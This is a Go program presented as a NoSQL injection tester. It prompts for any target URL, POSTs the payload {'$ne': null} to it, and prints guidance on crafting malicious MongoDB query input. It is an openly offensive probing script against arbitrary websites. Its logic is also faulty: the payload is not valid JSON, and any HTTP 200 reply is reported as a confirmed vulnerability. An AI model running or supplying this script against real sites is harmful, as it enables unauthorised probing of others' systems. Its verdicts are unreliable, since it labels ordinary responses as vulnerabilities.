package main

import (
    "bufio"
    "fmt"
    "log"
    "net/http"
    "os"
    "strings"
)

func main() {
    // Ask user for target website URL
    fmt.Print("Enter your target website URL: ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := scanner.Text()

    // Test for NoSQL Injection vulnerability
    vulnerable, err := testNoSQLInjection(targetURL)
    if err != nil {
        log.Fatalf("Error occurred while testing for NoSQL Injection: %v", err)
    }

    // Confirm if the target is vulnerable or not
    if vulnerable {
        fmt.Println("The target website is vulnerable to NoSQL Injection!")
        fmt.Println("Here's how to test the vulnerability:")
        fmt.Println("1. Identify endpoints where user input is used to construct database queries.")
        fmt.Println("2. Craft malicious input to manipulate the query logic, such as using $regex operators in MongoDB.")
        fmt.Println("3. Send the crafted input to the identified endpoints and observe if it leads to unexpected behavior.")
    } else {
        fmt.Println("The target website is not vulnerable to NoSQL Injection.")
    }
}

func testNoSQLInjection(targetURL string) (bool, error) {
    // Craft malicious input for testing
    maliciousInput := "{'$ne': null}"

    // Construct the URL for the request
    if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
        targetURL = "http://" + targetURL
    }

    fmt.Printf("Sending POST request to %s with malicious input: %s\n", targetURL, maliciousInput)

    // Send a request with the malicious input
    resp, err := http.Post(targetURL, "application/json", strings.NewReader(maliciousInput))
    if err != nil {
        return false, err
    }
    defer resp.Body.Close()

    fmt.Printf("Response Status Code: %d\n", resp.StatusCode)

    // Check the response for indicators of vulnerability
    if resp.StatusCode == http.StatusOK {
        return true, nil
    }

    return false, nil
}
